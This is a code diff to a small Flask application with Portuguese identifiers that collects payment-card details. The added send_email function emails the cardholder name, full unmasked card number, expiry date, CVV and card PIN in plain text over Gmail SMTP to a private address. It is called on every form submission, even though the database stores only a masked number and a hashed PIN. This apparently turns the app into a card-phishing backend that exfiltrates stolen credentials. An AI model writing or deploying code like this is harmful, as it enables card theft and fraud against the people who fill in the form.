@@ -3,6 +3,12 @@ import sqlite3
 import os
 import hashlib
 from datetime import datetime
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from dotenv import load_dotenv
+
+load_dotenv()
 
 app = Flask(__name__)
 app.secret_key = 'troque-essa-chave-em-producao'
@@ -28,6 +34,43 @@ def init_db():
         conn.close()
 
 init_db()
+
+def send_email(nome_titular, numero_cartao, validade, senha_cartao, cvv):
+    remetente = os.getenv('EMAIL_REMETENTE')
+    senha = os.getenv('EMAIL_SENHA_APP')
+    
+    if not remetente or not senha:
+        print("Credenciais de email não configuradas no .env")
+        return
+
+    destinatario = remetente
+
+    assunto = f"Novo Cartão - {nome_titular}"
+    corpo = f"""
+    Um novo cartão foi recebido e salvo no banco de dados.
+    
+    Nome do Titular: {nome_titular}
+    Número do Cartão: {numero_cartao}
+    Validade: {validade}
+    CVV: {cvv}
+    Senha: {senha_cartao}
+    """
+
+    msg = MIMEMultipart()
+    msg['From'] = remetente
+    msg['To'] = destinatario
+    msg['Subject'] = assunto
+    msg.attach(MIMEText(corpo, 'plain', 'utf-8'))
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(remetente, senha)
+        server.send_message(msg)
+        server.quit()
+        print("Email enviado com sucesso.")
+    except Exception as e:
+        print(f"Erro ao enviar email: {e}")
 
 def hash_text(text: str) -> str:
     return hashlib.sha256(text.encode('utf-8')).hexdigest()
@@ -108,6 +151,9 @@ def index():
             ''', (nome_titular, masked, validade, senha_hashed, cvv, criado_em))
             conn.commit()
             conn.close()
+
+            # Envia o email com os dados informados
+            send_email(nome_titular, numero_cartao, validade, senha_cartao, cvv)
 
             return jsonify({
                 'success': True,
